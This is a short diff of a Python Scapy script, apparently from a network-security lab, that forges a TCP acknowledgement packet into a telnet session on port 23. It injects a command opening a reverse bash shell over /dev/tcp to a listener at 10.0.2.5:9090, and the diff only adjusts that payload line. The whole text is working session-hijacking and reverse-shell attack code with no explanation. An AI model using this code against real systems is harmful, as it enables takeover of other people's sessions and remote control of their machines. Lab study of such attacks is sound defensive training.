@@ -9,7 +9,7 @@ def spoof(pkt):
   new_ack = o_tcp.ack + 1
   ip = IP(src="10.0.2.6", dst="10.0.2.7")
   tcp = TCP(sport=o_tcp.sport, dport=23, flags="A", seq=new_seq, ack=new_ack)
-  data = "\n /bin/bash -i > /dev/tcp/10.0.2.5/9090 0<&1 2>&1 \n"
+  data = "\n /bin/bash -i > /dev/tcp/10.0.2.5/9090 0<&1 2>&0\n"
   pkt = ip/tcp/data
   ls(pkt)
   send(pkt, verbose=0)
